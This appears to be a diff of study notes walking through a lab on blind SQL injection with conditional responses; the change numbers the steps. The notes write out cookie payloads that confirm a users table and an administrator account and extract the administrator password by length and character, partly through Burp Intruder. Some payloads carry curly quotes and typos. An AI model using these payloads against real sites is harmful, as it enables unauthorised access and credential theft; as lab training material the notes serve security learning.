@@ -31,43 +31,43 @@
 
 <b>Blind SQL injection with conditional responses</b>
 
-Modify the TrackingId cookie, changing it to:</br>
-TrackingId=xyz' AND '1'='1</br>
-Verify that the "Welcome back" message appears in the response.</br>
-Now change it to:</br>
+1. Modify the TrackingId cookie, changing it to:</br>
+2. TrackingId=xyz' AND '1'='1</br>
+ Verify that the "Welcome back" message appears in the response.</br>
+3. Now change it to:</br>
 TrackingId=xyz' AND '1'='2</br>
 Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
 </br>
-Now:</br>
+4. Now:</br>
 Confirm that there is a table called users.</br>
 ‘ AND (SELECT ‘a’ FROM users LIMIT 1)=‘a</br>
 Verify that the condition is true, confirming that there is a table called users.</br>
 
-Confirm that there is a user called administrator.</br>
+5. Confirm that there is a user called administrator.</br>
 ‘ AND (SELECT ‘a’ FROM users WHERE username=‘administrator’)=‘a</br>
 Verify that the condition is true, confirming that there is a user called administrator.</br>
 
-Determine the length of the password in the administrator user.</br>
+6. Determine the length of the password in the administrator user.</br>
 To do that: ‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>1)=‘a</br>
 This condition should be true, confirming that the password is greater than 1 character in length.</br>
 
-Send a series of follow-up values to test different password lengths. Send</br>
+7. Send a series of follow-up values to test different password lengths. Send</br>
 ‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>2)=‘a </br>
-Then send:</br>
+8. Then send:</br>
 ‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>3)=‘a </br>
 We can so this by manually by using Burp Repeater.</br>
 OR can do automatically by using Burp Intruder.</br>
-In Burp Intruder:</br>
+9. In Burp Intruder:</br>
 Choose Payload Type: Numbers</br>
 Change payload settings with Number range </br>
 From 1 to 25 and step 1</br>
 Place payload position markers around the final a character in the cookie value. To do this, select just the 1, and click the "Add §" button. </br>
 ‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>§1§)=‘a</br>
 
-Next:</br>
+10. Next:</br>
 Change the value of cookie in the position tab of the Burp Intruder. </br>
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a </br>
 This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
 
-Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
+11. Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
